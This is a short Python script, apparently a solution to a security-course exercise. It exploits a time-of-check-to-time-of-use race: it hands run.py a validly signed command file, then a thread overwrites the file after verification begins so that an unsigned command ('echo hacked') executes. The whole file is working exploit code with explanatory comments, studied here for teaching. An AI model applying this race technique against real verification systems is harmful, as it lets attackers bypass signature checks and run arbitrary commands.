import json
import os
from threading import Thread


#wait until run.py script run and work on the verify, and then we can change our data to the command we want to execute
def changefile(path):
    from time import sleep
    sleep(10)
    with open(path,'w') as writer:
        writer.write(json.dumps({'command' : 'echo hacked'}))
        #changing the content of the file after verify began working,so the execute will get this file that only run our command :
        # 'echo hacked'

def main(argv):
    data = "tempfile_for_run_q5"
    #first,in script we put a valid command that works,taken from example.json
    script = json.dumps({"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"})
    with open(data, 'w') as writer:
        writer.write(script)
    #now we create another thread that sleeps 10 seconds and then change the content of data
    thread = Thread(target = changefile, args = (data,))
    thread.start()
    #runing run.py script first with valid signuatre for echo cool
    os.system('python run.py ' + data)
    thread.join()


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
